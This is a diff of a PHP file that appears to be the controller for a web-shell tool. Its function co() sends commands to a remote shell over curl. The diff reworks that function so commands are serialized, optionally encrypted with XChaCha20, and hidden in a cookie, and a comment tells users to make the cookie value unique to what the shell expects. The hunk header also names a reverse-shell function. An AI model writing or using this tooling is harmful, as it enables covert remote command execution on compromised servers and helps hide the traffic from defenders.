@@ -174,31 +174,36 @@ function rev($host, $shell, $port, $os)
 
 function co($command, $host, $uri, bool $encrypt)
 {
-    $space_Safe_coms = '';
-    $commander = "";
+    $space_Safe_coms = null;
+    $cr = null;
     if ($encrypt === true && !is_null($command)){
-        $plain = $command;
         $our_nonce = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
         $secure_Key = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_KEYBYTES);
         $additionalData = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_ABYTES);
         try{
-            $cyphered = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt($plain, $additionalData, $our_nonce, $secure_Key);
-            $space_Safe_coms = "t=e&ne=" . base64_encode($our_nonce) . "&ad=" .base64_encode($additionalData) . "&k=" . base64_encode($secure_Key) . "&c=" .base64_encode($cyphered);
+            $un = base64_encode(serialize(array("plain" => $command)));
+            $ct = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt($un, $additionalData, $our_nonce, $secure_Key);
+            $cr = "2";
+            $space_Safe_coms = base64_encode(bin2hex($our_nonce).".".bin2hex($secure_Key).".". bin2hex($additionalData).".".base64_encode($ct));
         }catch (SodiumException $exception){
             echo $exception->getMessage();
             echo $exception->getTraceAsString();
             echo $exception->getLine();
         }
     }else{
-        $space_Safe_coms = "t=u&cr=" . base64_encode($command) . "";
+        $cr = "1";
+        $space_Safe_coms = base64_encode(serialize(array("cr"=>base64_encode($command))));
     }
-    if (!empty($host) && !empty($command) && !empty($uri)) {
+    if (!empty($host) && !is_null($space_Safe_coms) && !is_null($cr) && !empty($uri)) {
         curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
         curl_setopt(CHH, CURLOPT_TIMEOUT,                             15);
         curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                      15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
         curl_setopt(CHH, CURLOPT_POST,                              true);
-        curl_setopt(CHH, CURLOPT_POSTFIELDS,                  $space_Safe_coms);
+        //this is the default value the shell will be looking for, change it make it unique.
+        // and for those of you who read the source before you run. Howd ya get so smort.
+        curl_setopt(CHH, CURLOPT_COOKIE,          "cx={$space_Safe_coms}");
+        curl_setopt(CHH, CURLOPT_POSTFIELDS,                   "cr={$cr}");
         $syst = curl_exec(CHH);
         if (!curl_errno(CHH)){
             switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
